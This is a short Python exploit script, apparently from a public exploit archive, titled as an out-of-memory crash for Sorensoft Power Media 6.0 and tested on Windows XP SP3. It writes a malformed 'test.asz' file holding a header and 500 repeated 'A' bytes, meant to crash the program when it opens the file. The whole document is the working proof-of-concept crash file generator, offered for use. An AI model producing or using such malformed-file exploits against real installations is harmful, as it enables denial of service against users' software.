#!/usr/bin/python
#
# Exploit Title: Sorensoft Power Media 6.0 (out of memory)
# software: Sorensoft power media
# version : 6.0
# link: www.sorensoft.com
# Author: Onying (@onyiing)
# Website: otakku-udang.blogspot.com
# Tested on: Windows XP SP3

junk ="\x41"*500
textfile = open("test.asz" , 'w')
textfile.write("ASzf      Options.dat"+junk)
textfile.close()

